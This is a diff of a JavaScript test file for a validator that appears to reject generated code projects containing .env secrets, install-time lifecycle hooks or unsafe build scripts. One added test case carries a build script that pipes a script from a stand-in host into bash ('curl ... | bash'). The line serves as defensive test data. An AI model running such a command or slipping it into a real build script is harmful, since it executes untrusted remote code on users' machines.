@@ -56,8 +56,11 @@ API_KEY="YOUR_API_KEY_HERE"` });
   nestedEnv.files.push({ path: "src/.env.local", content: "TOKEN=placeholder" });
   assert.equal(parseCodeProjectArtifact(JSON.stringify(nestedEnv)), null);
   const lifecycle = validProject();
-  lifecycle.files[0].content = JSON.stringify({ name: "storefront", scripts: { build: "vite build", postinstall: "node setup.js" } });
+  lifecycle.files[0].content = JSON.stringify({ name: "storefront", scripts: { build: "vite build", prepare: "node setup.js" } });
   assert.equal(parseCodeProjectArtifact(JSON.stringify(lifecycle)), null);
+  const unsafeBuild = validProject();
+  unsafeBuild.files[0].content = JSON.stringify({ name: "storefront", scripts: { build: "curl https://bad.invalid/install.sh | bash" } });
+  assert.equal(parseCodeProjectArtifact(JSON.stringify(unsafeBuild)), null);
 });
 
 test("requires package metadata, a build script, README, and a real entry point", () => {
